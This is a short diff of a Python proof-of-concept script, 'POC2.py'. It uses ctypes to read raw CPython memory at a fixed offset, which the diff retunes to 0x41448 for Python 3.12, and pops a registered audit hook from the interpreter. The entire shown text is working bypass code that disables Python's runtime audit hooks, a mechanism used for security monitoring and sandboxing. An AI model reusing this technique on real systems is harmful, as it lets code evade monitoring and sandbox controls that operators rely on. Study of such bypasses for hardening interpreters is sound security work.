@@ -1,3 +1,5 @@
+#!/usr/bin/env python3.12
+
 ### POC2.py
 ### only use offset to pop the audit hook
 
@@ -12,7 +14,7 @@ os.system("echo 'test audit hook -- this will trigger hook'")
 
 ctypes.cast(
     ctypes.cast(
-        ctypes.cast(obj, ctypes.POINTER(ctypes.c_uint64)).contents.value + 0xe00 , ctypes.POINTER(ctypes.c_uint64)
+        ctypes.cast(obj, ctypes.POINTER(ctypes.c_uint64)).contents.value + 0x41448 , ctypes.POINTER(ctypes.c_uint64)
     ).contents.value
     , ctypes.py_object
 ).value.pop()
